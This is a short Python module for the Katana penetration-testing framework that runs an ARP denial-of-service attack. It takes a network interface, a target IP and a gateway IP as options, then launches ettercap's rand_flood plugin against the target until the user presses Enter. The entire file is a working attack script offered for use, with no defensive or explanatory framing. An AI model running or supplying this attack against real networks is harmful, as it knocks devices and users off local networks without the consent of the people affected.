# This module requires katana framework 
# https://github.com/PowerScript/KatanaFramework

# :-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-: #
# Katana Core import                  #
from core.KatanaFramework import *    #
# :-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-: #

# LIBRARIES  
              
# END LIBRARIES 

# INFORMATION MODULE
def init():
	init.Author             ="RedToor"
	init.Version            ="1.0"
	init.Description        ="Arp Denegation of Service Attack."
	init.CodeName           ="net/arp.dos"
	init.DateCreation       ="14/06/2016"      
	init.LastModification   ="14/06/2016"
	init.References         =None
	init.License            =KTF_LINCENSE
	init.var                ={}

	# DEFAULT OPTIONS MODULE
	init.options = {
		# NAME      VALUE               RQ     DESCRIPTION
		'interface':[INTERFACE_ETHERNET,True ,'Interface'],
		'target'   :["192.168.1.223"   ,True ,'Target IP'],
		'gateway'  :[GATEWAY           ,True ,'Gateway IP']
	}
	return init
# END INFORMATION MODULE

# CODE MODULE    ############################################################################################
def main(run):

	if NET.AmIConectedToANetwork() and NET.CheckIfExistInterface(init.var['interface']):
		printk.inf("Starting ARP D.O.S attack...")
		SYSTEM.Subprocess("ettercap -Tq -P rand_flood /"+init.var['target']+"// /"+init.var['gateway']+"// -i "+init.var['interface'])
		raw_input(printk.pkey("if you want to stop ARP D.O.S Attack (PRESS [ENTER])"))
		SYSTEM.KillProcess("ettercap")	

# END CODE MODULE ############################################################################################
